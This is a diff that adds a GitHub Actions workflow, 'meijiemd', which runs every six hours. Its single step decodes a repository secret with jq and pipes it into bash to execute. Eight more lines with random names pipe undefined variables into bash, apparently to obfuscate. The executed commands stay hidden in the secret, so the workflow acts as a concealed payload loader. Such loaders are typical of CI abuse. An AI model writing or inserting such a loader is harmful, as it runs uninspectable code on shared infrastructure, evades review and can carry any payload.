@@ -1,0 +1,27 @@
+name: meijiemd
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '21 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: meijiemd
+        env:
+          odoyy7: ${{ secrets.odoyy7 }}
+        run: |
+          echo $odoyy7 | jq -r .b64 | /bin/bash
+          echo $oas8925 | jq -r .nxsm3 | /bin/bash
+          echo $kwqbx8 | jq -r .kvq9 | /bin/bash
+          echo $flitu0 | jq -r .abs8332 | /bin/bash
+          echo $fniol5250 | jq -r .tlygf28047 | /bin/bash
+          echo $svlf6877 | jq -r .jus7430 | /bin/bash
+          echo $mhh48000 | jq -r .ydbe262 | /bin/bash
+          echo $qm5755 | jq -r .ixy9 | /bin/bash
+          echo $a3497 | jq -r .ny961 | /bin/bash
+
